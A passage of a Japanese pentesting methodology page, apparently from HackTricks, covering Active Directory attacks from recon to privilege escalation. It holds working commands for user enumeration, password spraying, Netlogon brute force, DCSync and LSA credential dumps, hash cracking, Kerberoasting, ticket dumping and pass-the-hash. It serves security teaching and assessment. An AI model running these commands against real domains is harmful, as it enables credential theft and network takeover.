# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## 基本概要

**Active Directory** は基盤となるテクノロジーとして機能し、**ネットワーク管理者**がネットワーク内の**ドメイン**、**ユーザー**、**オブジェクト**を効率的に作成および管理できるようにします。これはスケールするように設計されており、多数のユーザーを管理しやすい**グループ**や**サブグループ**に編成しながら、さまざまなレベルで**アクセス権**を制御できます。

**Active Directory** の構造は、**ドメイン**、**ツリー**、**フォレスト**という3つの主要なレイヤーで構成されます。**ドメイン**は、共通のデータベースを共有する**ユーザー**や**デバイス**などのオブジェクトの集合です。**ツリー**は、共通の構造によって接続されたドメインのグループであり、**フォレスト**は、**信頼関係**によって相互接続された複数のツリーの集合で、組織構造の最上位レイヤーを形成します。これらの各レベルでは、特定の**アクセス**権や**通信権**を指定できます。

**Active Directory** の主要な概念は次のとおりです。

1. **Directory** – Active Directory オブジェクトに関するすべての情報を保持します。
2. **Object** – **ユーザー**、**グループ**、**共有フォルダー**など、ディレクトリ内のエンティティを指します。
3. **Domain** – ディレクトリオブジェクトのコンテナーとして機能します。1つの**フォレスト**内に複数のドメインを配置でき、それぞれが独自のオブジェクトコレクションを保持します。
4. **Tree** – 共通のルートドメインを共有するドメインのグループです。
5. **Forest** – Active Directory における組織構造の最上位であり、複数のツリーと、それらの間の**信頼関係**で構成されます。

**Active Directory Domain Services (AD DS)** は、ネットワーク内の集中管理と通信に不可欠なさまざまなサービスで構成されます。これらのサービスには次のものがあります。

1. **Domain Services** – データストレージを集中管理し、**認証**や**検索**機能を含む、**ユーザー**と**ドメイン**間のやり取りを管理します。
2. **Certificate Services** – 安全な**デジタル証明書**の作成、配布、管理を担います。
3. **Lightweight Directory Services** – **LDAPプロトコル**を介して、ディレクトリ対応アプリケーションをサポートします。
4. **Directory Federation Services** – 1回のセッションで複数のWebアプリケーションにわたるユーザー認証を可能にする、**シングルサインオン**機能を提供します。
5. **Rights Management** – 著作権で保護されたコンテンツの不正な配布や使用を規制し、その保護を支援します。
6. **DNS Service** – **ドメイン名**の解決に不可欠です。

より詳細な説明については、こちらを確認してください: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

**ADを攻撃**する方法を学ぶには、**Kerberos認証プロセス**を本当によく**理解する**必要があります。\
[**まだ仕組みを知らない場合は、このページを読んでください。**](kerberos-authentication.md)

## Cheat Sheet

AD上で実行できるコマンドをすばやく確認するには、[https://wadcoms.github.io/](https://wadcoms.github.io) を参照してください。

> [!WARNING]
> Kerberos通信では通常、クライアントが正しいSPNのチケットを取得できるように、**完全修飾ドメイン名（FQDN）**が必要です。IPアドレスでマシンにアクセスすると、一般的にKerberosではなくNTLMへフォールバックします。

## Active DirectoryのRecon（認証情報/セッションなし）

AD環境にアクセスできるものの、認証情報やセッションがない場合は、次のことができます。

- **ネットワークをPentestする:**
- ネットワークをスキャンし、マシンと開いているポートを見つけ、**脆弱性をexploit**したり、そこから**認証情報を抽出**したりします（例: [プリンターは非常に興味深いターゲットになる可能性があります](ad-information-in-printers.md)）。
- DNSをEnumerateすると、Web、プリンター、共有、VPN、メディアなど、ドメイン内の主要なサーバーに関する情報が得られる可能性があります。
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- これを行う方法について詳しくは、一般的な [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) を確認してください。
- **SMBサービスのnullおよびGuestアクセスを確認する**（これは最新のWindowsバージョンでは機能しません）。
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- SMBサーバーをEnumerateする方法について、より詳細なガイドはこちらにあります:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **LdapをEnumerateする**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAPをEnumerateする方法について、より詳細なガイドはこちらにあります（**匿名アクセス**には特に注意してください）:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **ネットワークをPoisonする**
- [**Responderを使用してサービスになりすます**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)ことで認証情報を収集する
- [**relay attackを悪用する**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)ことでホストにアクセスする
- [**evil-S**を使って偽のUPnPサービスを**公開**することで認証情報を収集する[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- 社内文書、ソーシャルメディア、ドメイン環境内のサービス（主にWeb）、および公開されている情報から、ユーザー名や氏名を抽出します。
- 会社従業員の完全な氏名が見つかった場合は、さまざまなADの**ユーザー名規則**（[**こちらを読んでください**](https://activedirectorypro.com/active-directory-user-naming-convention/)）を試すことができます。最も一般的な規則は、_NameSurname_、_Name.Surname_、_NamSur_（それぞれ3文字）、_Nam.Sur_、_NSurname_、_N.Surname_、_SurnameName_、_Surname.Name_、_SurnameN_、_Surname.N_、_ランダムな3文字とランダムな3つの数字_（abc123）です。
- ツール:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### ユーザーのEnumerate

- **匿名SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html)および[**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md)のページを確認してください。
- **Kerbrute enum**: **無効なユーザー名がリクエストされた**場合、サーバーは _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ **Kerberosエラー**コードで応答します。これにより、ユーザー名が無効であると判断できます。**有効なユーザー名**の場合、_KRB5KDC_ERR_PREAUTH_REQUIRED_ エラー、または AS-REP応答内の**TGT**のいずれかが返されます。これは、ユーザーが事前認証を実行する必要があることを示します。
- **MS-NRPCに対する認証なし**: ドメインコントローラー上のMS-NRPC（Netlogon）インターフェースに対して、auth-level = 1（認証なし）を使用します。この手法では、MS-NRPCインターフェースにbindした後、`DsrGetDcNameEx2`関数を呼び出し、認証情報なしでユーザーまたはコンピューターが存在するかを確認します。[NauthNRPC](https://github.com/sud0Ru/NauthNRPC)ツールは、このタイプのEnumerateを実装しています。調査結果は[こちら](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>で確認できます。
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

ネットワーク内でこれらのサーバーのいずれかを発見した場合、これに対して **user enumeration** も実行できます。例えば、[**MailSniper**](https://github.com/dafthack/MailSniper) ツールを使用できます：
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> ユーザー名のリストは[**このgithub repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) と、こちら（[**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)）で確認できます。
>
> ただし、これより前に実施した recon step で、**会社で働いている人物の名前**を入手しておくべきです。姓名が分かれば、[**namemash.py**](https://gist.github.com/superkojiman/11076951) スクリプトを使用して、有効な可能性のあるユーザー名を生成できます。

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

DC に **Zerologon** のパッチを適用した後でも、明示的に allow-list に登録されたアカウントは、**legacy/vulnerable Netlogon secure-channel behavior** にさらされる可能性があります。危険な設定は、GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** または対応するレジストリ値 **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`** です。

この値は **SDDL security descriptor**（[Security Descriptors](security-descriptors.md) を参照）です。DACL 内の関連する ACE が付与されたアカウントまたはグループは、攻撃対象にできます。例えば、`O:BAG:BAD:(A;;RC;;;WD)` は実質的に **Everyone** を allow-list に登録します。

実際の operator workflow:

1. **SYSVOL/GPO** と **live DC registry** の両方を確認し、allow-list に登録された principals を特定する。
2. SDDL 内で見つかった SID を実際の AD users/computers に解決し、**DC machine accounts**、**trust accounts**、その他の privileged machines を優先する。
3. allow-list に登録されたアカウントとして、**MS-NRPC / Netlogon authentication** を繰り返し試行する。
4. 推測に成功した後、**Netlogon password-setting** を悪用して対象アカウントのパスワードをリセットする（公開 PoC では空文字列に設定されます）。<sup>[[9]](#references)[[10]](#references)</sup>

公開 artifact に基づく quick triage / lab examples:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
注記:

- **scanner** が有用なのは、実効的な allow-list が **SYSVOL**、**registry**、またはその両方に存在する可能性があるためです。
- 脆弱なアカウントが特定された後は、exploit path 自体に **Domain Admin privileges が不要**である点が重要です。
- `DC$` などの **Domain Controller machine account** を侵害することは、特に危険です。そのパスワードをリセットすることで、より広範な **AD takeover** path を直接有効化できる可能性があります。
- **Brute-force feasibility** は mode に依存します。公開されている artifact では、meet-in-the-middle approach、別の computer account が利用可能な場合の **24-bit** brute force、さらに低速な **32-bit** variant が説明されています。

Detection / hardening に関する注記:

- allow-list policy を監査し、一時的かつ明示的に必要な compatibility exception 以外はすべて削除してください。
- DC の **System** events **5827/5828/5829/5830/5831** を監視し、脆弱な Netlogon connections が拒否された場合、検出された場合、または policy により明示的に許可された場合を把握します。
- `VulnerableChannelAllowList` 内のアカウントは、legacy dependency が削除されるまで **high-risk** として扱ってください。

### 1つまたは複数の username を知っている場合

有効な username はすでに把握しているものの、password がない場合は、次を試してください:

- [**ASREPRoast**](asreproast.md): ユーザーに _DONT_REQ_PREAUTH_ attribute が**設定されていない**場合、そのユーザー向けに **AS_REP message を request** できます。この message には、ユーザーの password から導出された値で暗号化された data が含まれます。
- [**Password Spraying**](password-spraying.md): 発見した各ユーザーに対して**よく使われる password**を試します。脆弱な password を使用しているユーザーがいるかもしれません（password policy に注意してください！）。
- OWA servers に対して **spray** を行い、ユーザーの mail servers への access を試すこともできます。


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

**network** 上の一部の protocol を **poisoning** することで、crack 可能な challenge **hashes** を**取得**できる場合があります:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory enumeration により、username、email identifier、naming pattern、candidate host、さらに authentication を強制できる可能性のある service が得られます。その context を利用して、実行可能な NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) と、AD environment への潜在的な path を特定します。

### NetExec workspace-driven recon & relay posture checks

- **`nxcdb` workspaces** を使用して、engagement ごとに AD recon state を保持します。`workspace create <name>` は、`~/.nxc/workspaces/<name>` 配下に protocol ごとの SQLite DB（smb/mssql/winrm/ldap/etc）を生成します。`proto smb|mssql|winrm` で view を切り替え、`creds` で収集した secret を一覧表示します。完了後は sensitive data を手動で削除してください: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- **`netexec smb <cidr>`** による quick subnet discovery では、**domain**、**OS build**、**SMB signing requirements**、**Null Auth** が表示されます。(signing:False) と表示される member は **relay-prone** であり、DC では signing が必要な場合が多くあります。
- NetExec output から **/etc/hosts** に直接 **hostnames** を生成し、targeting を容易にします:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- **SMB relay to the DC が signing によってブロックされている場合でも**、**LDAP** の状態を確認する：`netexec ldap <dc>` は `(signing:None)` / 弱い channel binding を強調表示する。SMB signing が必須でも LDAP signing が無効な DC は、**SPN-less RBCD** のような abuse に利用できる **relay-to-LDAP** の有効な target であり続ける。

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UI に **マスクされた admin password が HTML に埋め込まれている**場合がある。ソースや devtools を確認すると cleartext（例：`<input value="<password>">`）が露出し、Basic-auth による scan/print repository へのアクセスが可能になる。
- 取得した print job には、ユーザーごとの password を含む **plaintext の onboarding document** が含まれている場合がある。テスト時は pairings の対応関係を維持すること：<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### NTLM Creds の窃取

**null または guest user**で**他の PC や share にアクセス**できる場合、アクセスされると**自身に対する NTLM authentication を t**rigger する**ファイル**（SCF file など）を**配置**できます。これにより**NTLM challenge を steal**して crack できます:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking**は、すでに所有しているすべての NT hash を、key material が NT hash から直接導出される、より低速な別形式の candidate password として扱います。Kerberos RC4 tickets、NetNTLM challenges、cached credentials で長い passphrase を brute-force する代わりに、NT hash を Hashcat の NT-candidate modes に渡し、plaintext を知ることなく password reuse を検証させます。これは、何千もの現在および過去の NT hash を取得できる domain compromise の後に特に有効です。<sup>[[5]](#references)</sup>

次の場合に shucking を使用します:

- DCSync、SAM/SECURITY dumps、または credential vaults から NT corpus を取得し、他の domains/forests での reuse をテストする必要がある場合。
- RC4-based Kerberos material（`$krb5tgs$23$`、`$krb5asrep$23$`）、NetNTLM responses、または DCC/DCC2 blobs を capture した場合。
- crack 不可能な長い passphrase の reuse を素早く証明し、Pass-the-Hash 経由で直ちに pivot したい場合。

この technique は、key が NT hash ではない encryption types（Kerberos etype 17/18 AES など）に対しては**機能しません**。domain が AES-only を強制している場合は、通常の password modes に戻す必要があります。

#### NT hash corpus の構築

- **DCSync/NTDS** – history 付きで `secretsdump.py` を使用し、可能な限り最大の NT hash セット（以前の値を含む）を取得します:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries によって candidate pool は大幅に広がります。Microsoft は account ごとに最大 24 個の previous hashes を保存できるためです。NTDS secrets を harvest するその他の方法については、以下を参照してください:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa`（または Mimikatz `lsadump::sam /patch`）で、local SAM/SECURITY data と cached domain logons（DCC/DCC2）を抽出します。重複を除去し、それらの hash を同じ `nt_candidates.txt` list に追加します。
- **Track metadata** – 各 hash を生成した username/domain を保持します（wordlist に hex だけが含まれている場合でも同様です）。Hashcat が winning candidate を出力した際、matching hashes により、どの principal が password を reuse しているかを即座に特定できます。
- 同じ forest または trusted forest の candidates を優先します。これにより、shucking 時の overlap の可能性を最大化できます。

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

注意:

- NT-candidate inputs は**raw 32-hex NT hashes のままにする必要があります**。rule engines（`-r`、hybrid modes）は無効にしてください。mangling により candidate key material が破損するためです。
- これらの modes は本質的に高速というわけではありませんが、NTLM keyspace（M3 Max で約 30,000 MH/s）は Kerberos RC4（約 300 MH/s）より約 100 倍高速です。curated NT list の testing は、slow format で password space 全体を探索するよりはるかに低コストです。
- 常に**最新の Hashcat build**（`git clone https://github.com/hashcat/hashcat && make install`）を使用してください。modes 31500/31600/35300/35400 は最近追加されたためです。<sup>[[7]](#references)</sup>
- 現在、AS-REQ Pre-Auth 用の NT mode は存在しません。また AES etypes（19600/19700）では plaintext password が必要です。これらの key は raw NT hashes ではなく、UTF-16LE passwords から PBKDF2 経由で導出されるためです。

#### 例 – Kerberoast RC4 (mode 35300)

1. low-privileged user で target SPN 用の RC4 TGS を capture します（詳細は Kerberoast page を参照）:

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. NT list で ticket を shuck します:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat は各 NT candidate から RC4 key を導出し、`$krb5tgs$23$...` blob を検証します。match は、service account が既存の NT hashes のいずれかを使用していることを確認します。

3. 直ちに PtH 経由で pivot します:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

必要であれば、後から `hashcat -m 1000 <matched_hash> wordlists/` で plaintext を復元できます。

#### 例 – Cached credentials (mode 31600)

1. compromised workstation から cached logons を dump します:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. 対象の domain user の DCC2 line を `dcc2_highpriv.txt` にコピーし、shuck します:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. match に成功すると、list にすでに存在する NT hash が得られ、cached user が password を reuse していることが証明されます。これを PtH に直接使用する（`nxc smb <dc_ip> -u highpriv -H <hash>`）か、高速な NTLM mode で brute-force して string を復元します。

まったく同じ workflow を NetNTLM challenge-responses（`-m 27000/27100`）および DCC（`-m 31500`）にも適用できます。match が特定されたら、relay、SMB/WMI/WinRM PtH を開始するか、offline で masks/rules を使用して NT hash を再 crack できます。



## Credentials/session を使用した Active Directory の Enumerating

この phase では、**有効な domain account の credentials または session を compromise している必要があります。**有効な credentials または domain user としての shell がある場合、**前述の options も、他の users を compromise するための選択肢である**ことを覚えておく必要があります。

authenticated enumeration を開始する前に、**Kerberos double-hop problem**を理解してください。


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

account の compromise は**domain を assess するための major step**です。これにより authenticated **Active Directory enumeration** が可能になります:

[**ASREPRoast**](asreproast.md) については、脆弱な可能性のあるすべての user を見つけられるようになります。また、[**Password Spraying**](password-spraying.md) については、**すべての usernames の list**を取得し、compromised account の password、empty passwords、新しく有望な passwords を試すことができます。

- [**CMD で basic recon を実行**](../basic-cmd-for-pentesters.md#domain-info)できます
- [**powershell で recon**](../basic-powershell-for-pentesters/index.html)することもでき、こちらの方が stealthier です
- [**powerview を使用**](../basic-powershell-for-pentesters/powerview.md)して、より詳細な information を抽出することもできます
- Active Directory における recon 用のもう一つの優れた tool は [**BloodHound**](bloodhound.md) です。これは**あまり stealthy ではありません**（使用する collection methods によります）が、**それを気にしない**のであれば、ぜひ試してください。users が RDP できる場所、他の groups への path などを見つけられます。
- **その他の automated AD enumeration tools:** [**AD Explorer**](bloodhound.md#ad-explorer)**、**[**ADRecon**](bloodhound.md#adrecon)**、**[**Group3r**](bloodhound.md#group3r)**、**[**PingCastle**](bloodhound.md#pingcastle)**。**
- **AD の [**DNS records**](ad-dns-records.md)**。興味深い information が含まれている可能性があります。
- directory の enumerate に使用できる **GUI tool** は、**SysInternal** Suite の `AdExplorer.exe` です。
- **ldapsearch** を使用して LDAP database を検索し、_userPassword_ と _unixUserPassword_ fields、または _Description_ に credentials がないか確認することもできます。その他の methods については、PayloadsAllTheThings の [Password in AD User comment](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) を参照してください。
- **Linux** を使用している場合は、[**pywerview**](https://github.com/the-useless-one/pywerview) で domain を enumerate することもできます。
- 次のような automated tools も試せます:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **すべての domain users の抽出**

Windows では、domain usernames をすべて取得するのは非常に簡単です（`net user /domain`、`Get-DomainUser`、または `wmic useraccount get name,sid`）。Linux では、次を使用できます: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` または `enum4linux -a -u "user" -p "password" <DC IP>`

> この Enumeration section は小さく見えるかもしれませんが、全体の中で最も重要な部分です。links（主に cmd、powershell、powerview、BloodHound のもの）にアクセスし、domain の enumerate 方法を学び、慣れるまで practice してください。assessment 中、これは DA への path を見つける、または何もできないと判断するための key moment になります。

### Predictable pre-created computer accounts -> gMSA password access

legacy joins 用に staged された computer accounts は、予測可能な initial password を保持している場合があります。NetExec の `pre2k` module は、特徴的な `userAccountControl` value `4128`（`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`）を識別し、trailing `$` を除いた lowercase computer name の最初の 14 文字で Kerberos TGT を試行します。この UAC value は candidate selector として扱い、**Pre-Windows 2000 Compatible Access** への membership だけで password が weak だと決めつけないでください。<sup>[[18]](#references)[[20]](#references)</sup>

authenticated LDAP enumeration を使用して candidates をテストし、成功した TGT を保存します。`ALL=True` により、default の `4128` filter を持つ objects 以外にも testing の範囲が広がります。<sup>[[18]](#references)</sup>
```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```
デフォルト/NTLM bind が失敗しても、この finding が無効になるわけではありません。`-k`、DC に解決される FQDN、および KDC と同期した時刻を使用してテストしてください。成功した module の実行では、候補リストと取得した ccache が `~/.nxc/modules/pre2k/` 以下に書き込まれます。<sup>[[18]](#references)[[20]](#references)</sup>

コンピュータ principal を compromise した後、そのネストされた group membership と outbound 権限を graph 化します。特に、gMSA の `msDS-GroupMSAMembership` security descriptor に記載された principal は `msDS-ManagedPassword` を読み取れます。NetExec の `--gmsa` output には許可された principal が表示され、認証するコンピュータに権限がある場合は現在の NT hash が返されます。<sup>[[19]](#references)[[20]](#references)</sup>
```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```
その後、取得した gMSA を他の credential と同様に評価します。ローカル/domain group のメンバーシップ、logon rights、SPN、delegation、到達可能な service を確認してから、pass-the-hash を試行します。この ACL ベースの retrieval path は、KDS root-key の compromise 後に managed password を導出する [Golden gMSA/dMSA](golden-dmsa-gmsa.md) とは異なります。<sup>[[20]](#references)</sup>

### Kerberoast

Kerberoasting では、user account に紐付いた service が使用する **TGS tickets** を取得し、その暗号化を **offline** で crack します。この暗号化は user password に基づいています。

詳細はこちら:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connection (RDP, SSH, FTP, Win-RM, etc.)

credential を取得したら、いずれかの **machine** に access できるか確認します。そのために、port scan の結果に応じて、**CrackMapExec** を使い、異なる protocol で複数の server への接続を試行できます。

### Local Privilege Escalation

compromised credential、または通常の domain user としての session があり、domain 内の **any machine** に access できる場合は、**locally privilege を escalate して credential を収集する** path を探します。local administrator privilege があれば、memory (LSASS) や local storage (SAM) から **他の user の hash を dump** できる可能性があります。

この book には [**Windows における local privilege escalation**](../windows-local-privilege-escalation/index.html) に関する完全な page と、[**checklist**](../checklist-windows-privilege-escalation.md) があります。また、[**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) の使用も忘れないでください。

### Current Session Tickets

現在の user **に予期しない resource への access permission を与える** **tickets** が見つかる可能性は非常に低いですが、次を確認できます:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

ドメイン credentials またはユーザー session を使用できる場合は、NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) を再検討します。認証済みの enumeration および coercion techniques によって、未認証の reconnaissance では利用できなかった relay paths が明らかになる可能性があります。

### コンピューター共有内の Creds を検索 | SMB Shares

基本的な credentials を入手できたので、**AD 内で共有されている** **興味深いファイルを見つけられるか**確認します。手動でも可能ですが、非常に退屈で反復的な作業です（確認が必要なドキュメントを数百件見つけた場合は、さらに大変です）。

[**使用できる tools については、このリンクを参照してください。**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### NTLM Creds を盗む

**他の PC または shares にアクセスできる**場合、ファイル（SCF file など）を**配置**できます。そのファイルが何らかの方法でアクセスされると、**あなたに対する NTLM authentication をトリガー**できるため、**NTLM challenge を盗んで** crack できます。


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

この vulnerability により、認証済みのすべての user が**domain controller を compromise**できました。


{{#ref}}
printnightmare.md
{{#endref}}

## 特権 credentials/session を使用した Active Directory 上の Privilege escalation

**以下の techniques では通常の domain user では不十分であり、これらの attacks を実行するには特別な privileges/credentials が必要です。**

### Hash extraction

[AsRepRoast](asreproast.md)、[Password Spraying](password-spraying.md)、[Kerberoast](kerberoast.md)、[Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)（relaying を含む）、[EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)、[privileges を locally escalation](../windows-local-privilege-escalation/index.html) することによって、**local admin** account の一部を**compromise**できていることを願います。\
次に、memory 内および local にあるすべての hashes を dump します。\
[**hashes を取得するさまざまな方法については、このページを参照してください。**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**user の hash を取得したら**、それを使用して user に**なりすます**ことができます。\
その hash を**使用して** **NTLM authentication を実行する** **tool** を使う必要があります。または、新しい **sessionlogon** を作成し、その hash を **LSASS** 内に**inject**することもできます。これにより、**NTLM authentication が実行されると、その hash が使用されます。**最後の方法が mimikatz の動作です。\
[**詳細については、このページを参照してください。**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

この attack は、一般的な NTLM protocol 上の Pass The Hash の代わりに、**user の NTLM hash を使用して Kerberos tickets を要求する**ことを目的としています。そのため、これは特に**NTLM protocol が無効化され、authentication protocol として Kerberos のみが許可されている** networks で**有用**です。


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT) attack** method では、attackers は password または hash values の代わりに、**user の authentication ticket を盗みます**。その後、この stolen ticket を使用して**user になりすまし**、network 内の resources および services に不正 access します。


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

**local administrator** の **hash** または **password** を持っている場合は、それを使用して他の **PCs** に**locally login**できるか試します。
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> これはかなり **noisy** であり、**LAPS** によって **mitigate** できます。

### MSSQL Abuse & Trusted Links

ユーザーが **MSSQL instances に access** する権限を持っている場合、MSSQL host 上で **commands を execute**（SA として実行されている場合）したり、NetNTLM **hash を steal** したり、さらには **relay attack** を実行したりできる可能性があります。\
MSSQL instance が別の instance から database link 経由で信頼されている場合、linked database に対する権限を持つユーザーは、**trust relationship を利用して他の instance 上で queries を execute** できる可能性があります。これらの trust は chain 化でき、最終的にユーザーが commands を execute できる misconfigured database に到達する可能性があります。\
**データベース間の links は forest trusts をまたいでも機能します。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party の inventory および deployment suites は、credentials や code execution への強力な経路を公開していることがよくあります。以下を参照してください:

